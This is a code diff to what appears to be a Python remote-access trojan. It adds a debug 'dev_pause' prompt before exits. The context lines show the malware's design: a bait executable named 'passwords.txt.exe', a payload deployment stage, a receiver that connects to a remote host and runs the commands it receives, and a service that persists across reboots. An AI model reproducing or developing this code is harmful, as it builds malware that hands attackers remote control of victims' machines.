@@ -126,6 +126,15 @@ def log(msg: str) -> None:
         print(msg)
 
 
+def dev_pause() -> None:
+    """In dev mode, pause before exit so user can read console output."""
+    if VERBOSE:
+        try:
+            input("\n[DEV MODE] Press Enter to close console...")
+        except:
+            pass  # In case stdin is not available
+
+
 def is_bait_file() -> bool:
     """Check if currently running as the bait file (passwords.txt.exe)."""
     exe_name = os.path.basename(sys.executable).lower()
@@ -228,10 +237,12 @@ def deploy_payload():
         )
 
         log("[Stage 1: Complete - Exiting bait file]")
+        dev_pause()
         sys.exit(0)  # Success
 
     except Exception as e:
         log(f"[Stage 1: Failed - {e}]")
+        dev_pause()
         sys.exit(1)  # Failure - exit with error code
 
 
@@ -404,6 +415,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
                     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 except socket.gaierror:
                     log(f"Invalid host address: {host}")
+                    dev_pause()
                     sys.exit(1)
 
             # Reset attempt counter after successful connection
@@ -444,6 +456,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
 
                             # Exit completely (don't reconnect)
                             log("Service uninstalled. Exiting.")
+                            dev_pause()
                             sys.exit(0)
 
                         elif command.strip().lower() == "/exit":
@@ -456,6 +469,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
 
                             # Exit without uninstalling (will restart on next boot)
                             log("Exiting. Service remains installed.")
+                            dev_pause()
                             sys.exit(0)
 
                         log(f"$ {command}")
@@ -484,12 +498,15 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
     except KeyboardInterrupt:
         if platform.system() == "Windows":
             log("\n\nReceiver interrupted - restarting...")
+            dev_pause()
             sys.exit(1)  # Non-zero exit triggers service restart
         else:
             log("\n\nExiting...")
+            dev_pause()
             sys.exit(0)  # Clean exit on macOS/Linux
     except Exception as e:
         log(f"Error: {e}")
+        dev_pause()
         sys.exit(1)
 
 
@@ -608,6 +625,7 @@ if __name__ == "__main__":
             log(f"Current name: {os.path.basename(sys.executable)}")
             log(f"Expected: 'passwords.txt.exe' or '{PAYLOAD_NAME}'")
             log("Exiting...\n")
+            dev_pause()
             sys.exit(1)
 
     else:
